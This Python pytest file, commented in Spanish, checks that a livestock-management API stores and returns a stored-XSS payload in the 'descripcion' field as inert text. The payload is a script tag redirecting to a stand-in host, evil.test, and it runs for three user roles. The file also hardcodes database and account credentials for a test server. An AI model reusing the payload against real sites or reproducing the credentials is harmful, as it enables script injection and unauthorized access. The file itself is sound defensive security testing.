"""TC-M02-G47 / TC-M02-089 - RF-40: resistencia a XSS almacenado en `descripcion`.

Seguridad, ASVS V5.3 / OWASP API8.

El sub-caso se ejecuta con los tres actores obligatorios de RF-40 (Productor,
Veterinario e Ingeniero de campo) sobre un activo de acceso legitimo para cada uno.
La unica entrada especial es `descripcion`; el resto del evento es valido.

A diferencia de G44-G46, aqui la ficha espera que el evento SE ALMACENE: el sistema
debe guardar el texto sin ejecutarlo. Por eso este archivo genera exactamente
3 escrituras oficiales, una por actor, y ninguna otra.

El SETUP es de solo lectura: SELECT, GET y login. No crea ni modifica datos.

La dimension de renderizado seguro (S6/S7) se verifica sobre el DOM real de la vista
que presenta la descripcion; vive en `verificar_render_tc_m02_g47.cy.js` porque exige
un navegador. Este archivo comprueba la parte de API, persistencia y asociacion.

Ejecucion:
    pytest -q test_tc_m02_g47.py --junitxml=Resultados/reporte_tc_m02_g47.xml
"""

from __future__ import annotations

import json
import os
from dataclasses import dataclass, field
from datetime import datetime, timedelta, timezone
from typing import Any

import psycopg2
import pytest
import requests

# --------------------------------------------------------------------------------------
# Configuracion del ambiente TEST
# --------------------------------------------------------------------------------------

BASE_URL = 'https://sigab-backendtest-389pcb-a48238-158-69-200-27.sslip.io/api-sgpmp-test'
DSN = 'postgresql://member_qa:qaSGP2026@158.69.200.27:5448/sgpmp_test'
TIMEOUT = 30

# Payload oficial de TC-M02-089. Contenido funcional exacto de la ficha; las comillas
# simples de Python evitan cualquier escapado del contenido.
PAYLOAD_XSS = '<script>document.location="http://evil.test"</script>'

# Payload base valido (probado en TC-M02-G43 con HTTP 201 sobre estos mismos activos).
# La fecha se calcula al arrancar la sesion: el backend rechaza con FECHA_FUTURA cualquier
# fecha posterior al instante actual, asi que se toma "ahora" con un margen de dos minutos
# hacia atras para absorber la desviacion de reloj entre la estacion de QA y el servidor.
# Sigue siendo muy posterior al ultimo evento de los tres activos (2026-09-09 23:01Z).
FECHA_EVENTO = (
    datetime.now(timezone.utc).replace(microsecond=0) - timedelta(minutes=2)
).isoformat().replace('+00:00', 'Z')
TIPO_MEDICION = 'PESO'
VALOR_MEDICION = 250
UNIDAD_MEDIDA = 'kg'


@dataclass
class Actor:
    clave: str
    nombre: str
    correo: str
    contrasena: str
    id_usuario: int
    id_activo: int
    # Rellenados durante la ejecucion.
    token: str = ''
    conteo_antes: int = -1
    conteo_despues: int = -1
    id_evento: int = -1
    respuesta_post: dict[str, Any] = field(default_factory=dict)


# El paquete de instrucciones indica `juan.carlos@email.com` para el Veterinario. Ese
# correo ya no existe en TEST y devuelve 401; la cuenta vigente del mismo usuario
# (id 3, rol 3 Veterinario) es la de abajo. Se documenta en el informe; no se creo
# ni modifico ninguna cuenta.
ACTORES: list[Actor] = [
    Actor('productor', 'Productor', 'm2m.nuevo@ejemplo.com', 'Test1234!', 35, 279),
    Actor('veterinario', 'Veterinario', 'juan.carlos.qa133@sgpmp-test.com', 'Test1234!', 3, 311),
    Actor('ingeniero', 'Ingeniero de campo', 'ingeniero@pecuaria.co', 'Pruebas12#', 4, 312),
]

POR_CLAVE = {a.clave: a for a in ACTORES}

# Evidencia consolidada que se vuelca a disco al final de la sesion, para que el informe
# y la verificacion de renderizado trabajen sobre los identificadores reales.
EVIDENCIA: dict[str, Any] = {'payload': PAYLOAD_XSS, 'actores': {}}


# --------------------------------------------------------------------------------------
# Utilidades de solo lectura
# --------------------------------------------------------------------------------------

def sql(consulta: str, parametros: tuple = ()) -> list[tuple]:
    """Ejecuta una consulta de SOLO LECTURA sobre PostgreSQL TEST.

    La conexion se abre en modo read-only, de modo que cualquier intento accidental de
    escritura seria rechazado por el propio servidor.
    """
    with psycopg2.connect(DSN) as conexion:
        conexion.set_session(readonly=True, autocommit=True)
        with conexion.cursor() as cursor:
            cursor.execute(consulta, parametros)
            return cursor.fetchall()


def contar_eventos_crecimiento(id_activo: int) -> int:
    filas = sql(
        """
        SELECT count(*)
        FROM modulo2.eventos_activos ea
        JOIN modulo2.eventos_crecimeinto ec ON ec.id_evento = ea.id_eventos
        WHERE ea.id_activo_biologico = %s
        """,
        (id_activo,),
    )
    return int(filas[0][0])


def autenticar(actor: Actor) -> str:
    respuesta = requests.post(
        f'{BASE_URL}/sesiones/',
        json={'correo_electronico': actor.correo, 'contrasena': actor.contrasena},
        timeout=TIMEOUT,
    )
    assert respuesta.status_code == 200, (
        f'Login fallido para {actor.nombre}: HTTP {respuesta.status_code} {respuesta.text[:300]}'
    )
    return respuesta.json()['token']


def cuerpo_base(actor: Actor) -> dict[str, Any]:
    """Payload completo del evento. Todo es valido salvo el contenido de `descripcion`."""
    return {
        'tipo_medicion': TIPO_MEDICION,
        'valor_medicion': VALOR_MEDICION,
        'unidad_medida': UNIDAD_MEDIDA,
        'fecha': FECHA_EVENTO,
        'descripcion': PAYLOAD_XSS,
        # `tipo_agregacion` se omite deliberadamente: los tres activos son INDIVIDUAL y
        # el contrato lo declara opcional. Ver TC-M02-G45 para las reglas de agregacion.
    }


# --------------------------------------------------------------------------------------
# Fixtures
# --------------------------------------------------------------------------------------

@pytest.fixture(scope='session')
def contrato() -> dict[str, Any]:
    respuesta = requests.get(f'{BASE_URL}/openapi.json', timeout=TIMEOUT)
    assert respuesta.status_code == 200, 'El backend TEST HTTPS no responde 200 en openapi.json'
    return respuesta.json()


@pytest.fixture(scope='session', autouse=True)
def setup_solo_lectura(contrato: dict[str, Any]) -> None:
    """Etapa 1: revision de datos existentes. 0 escrituras.

    Comprueba, sin crear nada, que cada actor tiene un activo existente, ACTIVO, con
    fase productiva activa y de acceso legitimo.
    """
    ruta = '/activos-biologicos/{id_activo}/eventos/crecimiento'
    assert ruta in contrato['paths'], 'El contrato no declara el endpoint de crecimiento'
    dto = contrato['components']['schemas']['RegistrarEventoCrecimientoDTO']
    assert 'descripcion' in dto['properties'], 'El contrato no declara el campo `descripcion`'
    # Si el contrato impusiera una longitud maxima menor que el payload oficial, el caso
    # quedaria bloqueado en vez de recortar el payload en silencio.
    assert 'maxLength' not in json.dumps(dto['properties']['descripcion']), (
        'El contrato declara una longitud maxima para `descripcion`: revisar si admite el payload oficial'
    )

    for actor in ACTORES:
        filas = sql(
            """
            SELECT e.nombre,
                   ab.tipo,
                   (SELECT count(*) FROM modulo2.gestiones_fases gf
                     WHERE gf.id_activo_biologico = ab.id_activo_biologico AND gf.es_activa)
            FROM modulo2.activos_biologicos ab
            JOIN modulo2.estados_activos_biologicos e
              ON e.id_estado_activo_biologico = ab.id_estado
            WHERE ab.id_activo_biologico = %s
            """,
            (actor.id_activo,),
        )
        assert filas, f'El activo {actor.id_activo} de {actor.nombre} no existe en TEST'
        estado, tipo, fases_activas = filas[0]
        assert estado == 'ACTIVO', f'El activo {actor.id_activo} no esta ACTIVO ({estado})'
        assert tipo == 'INDIVIDUAL', f'El activo {actor.id_activo} no es INDIVIDUAL ({tipo})'
        assert fases_activas == 1, (
            f'El activo {actor.id_activo} no tiene exactamente una fase productiva activa'
        )

        actor.token = autenticar(actor)
        cabeceras = {'Authorization': f'Bearer {actor.token}'}
        acceso = requests.get(
            f'{BASE_URL}/activos-biologicos/{actor.id_activo}', headers=cabeceras, timeout=TIMEOUT
        )
        assert acceso.status_code == 200, (
            f'{actor.nombre} no tiene acceso legitimo al activo {actor.id_activo}: '
            f'HTTP {acceso.status_code}'
        )
        actor.conteo_antes = contar_eventos_crecimiento(actor.id_activo)


@pytest.fixture(scope='session', autouse=True)
def volcar_evidencia() -> Any:
    yield
    for actor in ACTORES:
        EVIDENCIA['actores'][actor.clave] = {
            'nombre': actor.nombre,
            'correo': actor.correo,
            'id_usuario': actor.id_usuario,
            'id_activo': actor.id_activo,
            'id_evento': actor.id_evento,
            'conteo_antes': actor.conteo_antes,
            'conteo_despues': actor.conteo_despues,
        }
    destino = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'Resultados', 'evidencia_g47.json')
    os.makedirs(os.path.dirname(destino), exist_ok=True)
    with open(destino, 'w', encoding='utf-8') as fichero:
        json.dump(EVIDENCIA, fichero, ensure_ascii=False, indent=2)


@pytest.fixture(scope='session', params=[a.clave for a in ACTORES])
def actor(request: pytest.FixtureRequest) -> Actor:
    return POR_CLAVE[request.param]


# --------------------------------------------------------------------------------------
# TC-M02-089 - una ejecucion oficial por actor
# --------------------------------------------------------------------------------------

class TestTCM02089:
    """Un POST oficial por actor con el payload XSS en `descripcion`.

    Los tests se ejecutan en orden dentro de la clase: `test_s2` realiza la unica
    escritura y el resto verifica sus consecuencias.
    """

    def test_s1_peticion_valida(self, actor: Actor) -> None:
        """S1 - todos los campos distintos de `descripcion` cumplen el contrato."""
        cuerpo = cuerpo_base(actor)
        assert cuerpo['tipo_medicion'] == 'PESO'
        assert cuerpo['valor_medicion'] > 0
        assert cuerpo['unidad_medida'] == 'kg', 'kg es una unidad permitida para PESO'
        assert 'tipo_agregacion' not in cuerpo, 'activo INDIVIDUAL: no aplica tipo_agregacion'

        ultimo = sql(
            """
            SELECT max(ea.fecha)
            FROM modulo2.eventos_activos ea
            JOIN modulo2.eventos_crecimeinto ec ON ec.id_evento = ea.id_eventos
            WHERE ea.id_activo_biologico = %s
            """,
            (actor.id_activo,),
        )[0][0]
        fecha_envio = datetime.fromisoformat(FECHA_EVENTO.replace('Z', '+00:00'))
        if ultimo is not None:
            assert fecha_envio > ultimo.astimezone(timezone.utc), (
                'La fecha del evento debe ser posterior al ultimo evento registrado'
            )
        assert fecha_envio <= datetime.now(timezone.utc), (
            'La fecha del evento no puede ser futura: el backend la rechaza con FECHA_FUTURA'
        )

        # A1/A2/A11: la cadena enviada es exactamente la de la ficha, sin transformaciones.
        assert cuerpo['descripcion'] == PAYLOAD_XSS
        assert json.loads(json.dumps(cuerpo))['descripcion'] == PAYLOAD_XSS, (
            'La serializacion JSON alteraria el contenido funcional del payload'
        )

    def test_s2_evento_registrado(self, actor: Actor) -> None:
        """S2 - el POST devuelve el exito del contrato y un identificador utilizable.

        Esta es la unica escritura oficial de cada actor.
        """
        respuesta = requests.post(
            f'{BASE_URL}/activos-biologicos/{actor.id_activo}/eventos/crecimiento',
            headers={'Authorization': f'Bearer {actor.token}', 'Content-Type': 'application/json'},
            json=cuerpo_base(actor),
            timeout=TIMEOUT,
        )
        actor.respuesta_post = {
            'http': respuesta.status_code,
            'cuerpo': respuesta.text[:1500],
            'peticion_enviada': respuesta.request.body.decode('utf-8')
            if isinstance(respuesta.request.body, bytes)
            else respuesta.request.body,
        }
        EVIDENCIA.setdefault('respuestas', {})[actor.clave] = actor.respuesta_post

        # La ficha espera almacenamiento, no rechazo: un 4xx aqui NO es aprobacion.
        assert respuesta.status_code == 201, (
            f'{actor.nombre}: se esperaba HTTP 201 (la ficha exige que el texto se almacene), '
            f'se obtuvo HTTP {respuesta.status_code}: {respuesta.text[:400]}'
        )
        evento = respuesta.json()['evento']
        assert isinstance(evento['id_eventos'], int) and evento['id_eventos'] > 0
        actor.id_evento = evento['id_eventos']

    def test_s3_persistencia_mas_uno(self, actor: Actor) -> None:
        """S3 - el evento existe en BD y el conteo aumenta exactamente +1."""
        assert actor.id_evento > 0, 'Sin evento creado no puede verificarse la persistencia'
        actor.conteo_despues = contar_eventos_crecimiento(actor.id_activo)
        assert actor.conteo_despues == actor.conteo_antes + 1, (
            f'{actor.nombre}: se esperaba {actor.conteo_antes} -> {actor.conteo_antes + 1}, '
            f'se obtuvo {actor.conteo_despues}'
        )
        filas = sql(
            'SELECT count(*) FROM modulo2.eventos_crecimeinto WHERE id_evento = %s',
            (actor.id_evento,),
        )
        assert filas[0][0] == 1, 'El detalle de crecimiento del evento no quedo persistido'

    def test_s4_descripcion_asociada_al_evento(self, actor: Actor) -> None:
        """S4 - el evento creado contiene exactamente la descripcion enviada."""
        filas = sql(
            'SELECT descripcion FROM modulo2.eventos_activos WHERE id_eventos = %s',
            (actor.id_evento,),
        )
        assert filas, f'El evento {actor.id_evento} no existe en BD'
        almacenada = filas[0][0]
        EVIDENCIA.setdefault('descripcion_bd', {})[actor.clave] = almacenada
        assert almacenada == PAYLOAD_XSS, (
            'El texto persistido no coincide con el payload enviado.\n'
            f'  enviado:   {PAYLOAD_XSS!r}\n  almacenado: {almacenada!r}'
        )

    def test_s5_no_ejecucion_en_api(self, actor: Actor) -> None:
        """S5 - la API trata el contenido como dato: lo devuelve integro y como texto."""
        cabeceras = {'Authorization': f'Bearer {actor.token}'}
        respuesta = requests.get(
            f'{BASE_URL}/activos-biologicos/{actor.id_activo}/historial?page_size=100',
            headers=cabeceras,
            timeout=TIMEOUT,
        )
        assert respuesta.status_code == 200

        # El contenido viaja como cadena dentro de JSON, no como HTML interpretable.
        tipo_contenido = respuesta.headers.get('Content-Type', '')
        assert 'application/json' in tipo_contenido, (
            f'El historial deberia servirse como JSON y no como HTML; Content-Type: {tipo_contenido}'
        )

        registros = respuesta.json()['registros']
        coincidencias = [r for r in registros if r.get('descripcion') == PAYLOAD_XSS]
        assert coincidencias, 'La API no devuelve la descripcion registrada'
        EVIDENCIA.setdefault('descripcion_api', {})[actor.clave] = coincidencias[0]['descripcion']

        # En el JSON crudo la cadena viaja escapada como valor, nunca como marcado suelto.
        crudo = respuesta.text
        assert '"<script>document.location=\\"http://evil.test\\"</script>"' in crudo or \
               json.dumps(PAYLOAD_XSS) in crudo, (
            'El payload no aparece como valor de cadena JSON en la respuesta'
        )

    def test_s8_asociacion_actor_y_activo(self, actor: Actor) -> None:
        """S8 - el evento quedo asociado al actor y al activo utilizados."""
        filas = sql(
            'SELECT id_usuario, id_activo_biologico FROM modulo2.eventos_activos WHERE id_eventos = %s',
            (actor.id_evento,),
        )
        id_usuario, id_activo = filas[0]
        assert id_usuario == actor.id_usuario, (
            f'El evento {actor.id_evento} quedo asociado al usuario {id_usuario} '
            f'y no a {actor.nombre} (usuario {actor.id_usuario})'
        )
        assert id_activo == actor.id_activo, (
            f'El evento {actor.id_evento} quedo asociado al activo {id_activo} '
            f'en vez de al {actor.id_activo}'
        )

    def test_aislamiento_sin_otras_escrituras(self, actor: Actor) -> None:
        """Regla de aislamiento: este actor genero exactamente un evento nuevo."""
        filas = sql(
            """
            SELECT count(*)
            FROM modulo2.eventos_activos
            WHERE id_activo_biologico = %s AND descripcion = %s
            """,
            (actor.id_activo, PAYLOAD_XSS),
        )
        assert filas[0][0] == 1, (
            f'Se esperaba exactamente un evento con el payload oficial en el activo '
            f'{actor.id_activo}; se encontraron {filas[0][0]}'
        )
